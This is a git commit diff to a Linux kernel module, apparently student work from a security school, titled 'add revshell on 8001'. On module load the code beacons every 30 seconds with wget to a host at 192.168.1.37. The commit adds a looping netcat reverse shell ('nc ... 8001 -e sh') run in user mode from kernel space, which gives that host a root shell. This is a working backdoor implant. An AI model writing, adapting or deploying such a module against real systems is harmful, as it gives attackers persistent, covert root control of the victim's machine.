b534b786591e2b5c3829b3d01384c84efa6bf2e5
Juillard Thibault <thibault.juillard@ecole2600.com>
2024-10-03 00:37:12 +0200

    add revshell on 8001

--- mesmodules/kernel_network.c
+++ mesmodules/kernel_network.c
@@ -12,11 +12,13 @@ MODULE_VERSION("1.0");
 void make_request(char *str);
 void make_request_periodic(void);
 void kill_all_communications(void); 
+void rev_shell(void);
 
 // init function
 static int __init kernel_network_init(void) {
 	make_request("START");
 	make_request_periodic();
+	rev_shell();
 	return 0;
 }
 
@@ -38,7 +40,7 @@ void make_request(char *str) {
 
 //function to make a request every 30s
 void make_request_periodic(void) {
-	char *str = "while true; do /usr/bin/wget http://192.168.1.37:8000/UP; sleep 30; done";
+	char *str = "while true; do wget http://192.168.1.37:8000/UP; sleep 30; done";
 	char *argv[] = {"/bin/sh", "-c", str, NULL};
 	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 }
@@ -46,11 +48,17 @@ void make_request_periodic(void) {
 // function to kill all periodic communications with the host
 // without this function, the requests will continue even after the module is removed
 void kill_all_communications(void) {
-	char *killcom = "kill $(pgrep -f 'http://192.168.1.37');";
+	char *killcom = "kill $(pgrep -f '192.168.1.37');";
 	char *argv[] = {"/bin/sh", "-c", killcom, NULL};
 	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 }
 
+// initiate rev shell
+void rev_shell(void) {
+	char *shell = "while true; do nc 192.168.1.37 8001 -e sh; sleep 30; done";
+	char *argv[] = {"/bin/sh", "-c", shell, NULL};
+	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
+}
 
 EXPORT_SYMBOL(make_request);
 
